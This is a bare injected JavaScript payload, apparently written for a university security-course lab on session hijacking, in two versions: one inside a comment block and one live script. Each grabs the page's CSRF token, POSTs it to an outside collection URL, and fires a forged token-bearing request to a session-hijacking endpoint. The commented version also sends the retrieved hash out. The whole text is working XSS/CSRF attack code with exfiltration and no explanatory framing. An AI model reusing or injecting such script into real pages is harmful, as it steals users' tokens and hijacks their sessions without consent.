{/* <script>
const csrfTokenMetaTag = document.querySelector('input[name="csrfmiddlewaretoken"]');
const csrfToken = csrfTokenMetaTag ? csrfTokenMetaTag.getAttribute('content') : '';

function sendData(message) {
  fetch('https://cs6262.gtisc.gatech.edu/receive/gyadav35/699', {
    method: 'POST',
    body: message // Directly pass the message as a string
  })
  .then(response => {
    if (!response.ok) {
      console.error('Failed to send data:', response.statusText);
    } else {
      console.log('Data sent successfully:', message);
    }
  })
  .catch(error => console.error('Fetch error:', error));
}

function debugLog(message) {
  // Assuming debugLog sends logs similarly to sendData
  sendData('Starting session hijacking attempt with gyadav35 - debugLog');
  sendData('Debug log: ' + message);
}

function submitSessionHijacking() {
  sendData('Starting session hijacking attempt with gyadav35 - submitSessionHijacking');
  sendData(`Token: ${csrfToken}`);
  document.querySelector('#sessionHijack').value = 'gyadav35';
  debugLog('Set #sessionHijack value to gyadav35');
  fetch('/session-hijacking/gyadav35', {
    method: 'post',
    headers: new Headers({
      'Content-Type': 'application/json',
      'X-CSRFToken': csrfToken
    })
  })
  .then(response => {
    if (!response.ok) throw new Error('Network response was not ok');
    return response.json();
  })
  .then(data => {
    const { hash } = data;
    debugLog('Received hash: ' + hash);
    return sendData({ hash: hash, message: 'Hash retrieved successfully.' });
  })
  .catch(error => {
    debugLog('Failed to retrieve hash: ' + error.message);
    return sendData({ hash: null, message: 'Failed to retrieve hash: ' + error.message });
  });
}

submitSessionHijacking();
</script>

 */}


<script>
function getCSRFToken() {
  // Check input field
  const csrfTokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
  if (csrfTokenInput && csrfTokenInput.value) {
    return csrfTokenInput.value;
  }

  // Check meta tag
  const csrfTokenMetaTag = document.querySelector('meta[name="csrf-token"]');
  if (csrfTokenMetaTag && csrfTokenMetaTag.content) {
    return csrfTokenMetaTag.content;
  }

  // Return empty string if token not found
  return '';
}

function sendData(message) {
  fetch('https://cs6262.gtisc.gatech.edu/receive/gyadav35/699', {
    method: 'POST',
    body: message // Directly pass the message as a string
  })
  .then(response => {
    if (!response.ok) {
      console.error('Failed to send data:', response.statusText);
    } else {
      console.log('Data sent successfully:', message);
    }
  })
  .catch(error => console.error('Fetch error:', error));
}

function debugLog(message) {
  sendData('Debug log: ' + message); // Send debug logs using sendData function
}

function submitSessionHijacking(csrfToken) {
  sendData('Starting session hijacking attempt with gyadav35 - submitSessionHijacking');
  sendData(`Token: ${csrfToken}`);
  document.querySelector('#sessionHijack').value = 'gyadav35';
  debugLog('Set #sessionHijack value to gyadav35');
  fetch('/session-hijacking/gyadav35', {
    method: 'post',
    headers: new Headers({
      'Content-Type': 'application/json',
      'X-CSRFToken': csrfToken,
      'Accept': 'text/plain' // Specify the expected response content type
    })
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.text(); // Ensure response is read as text
  })
  .then(data => {
    // Handle the response data here
    console.log('Response data:', data);
  })
  .catch(error => {
    // Handle errors here
    console.error('Error:', error);
  });
}

// Execute the script immediately when loaded
const csrfToken = getCSRFToken(); // Ensure CSRF token is retrieved when needed
if (!csrfToken) {
  console.error('CSRF token is not available.');
} else {
  submitSessionHijacking(csrfToken);
}
</script>



